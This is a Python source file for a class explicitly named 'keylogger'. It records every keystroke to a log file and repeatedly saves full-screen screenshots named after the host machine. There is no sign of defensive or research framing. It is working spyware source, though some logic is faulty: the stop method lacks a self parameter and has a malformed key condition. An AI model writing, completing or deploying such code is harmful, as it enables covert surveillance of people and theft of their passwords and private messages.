import os, socket, pyautogui

from pynput.keyboard import Key
from functions import translateKeys

class keylogger:
    def __init__(self, log_file = 'logs/log.txt', filePng = f'{socket.gethostname()}.png'):
        self.__log_file = log_file
        self.__file_png = filePng

    def screenshot(self):
        if not os.path.exists(self.__file_png):
            pyautogui.screenshot().save(self.__file_png)
            pyautogui.screenshot().close()
            
        pyautogui.screenshot().save(self.__file_png)
        pyautogui.screenshot().close()
        

    def stopKeyLogger(key):
        if key == Key.esc and Key.f2:
            return False
        
    def writeLog(self, key):
        key_data = str(key).replace("'", "") 
        tKeys = translateKeys.rtrnKeys()
       
        for key in tKeys:
            key_data = key_data.replace(key, tKeys[key])

        with open(self.__log_file, "a") as l:
            l.write(key_data)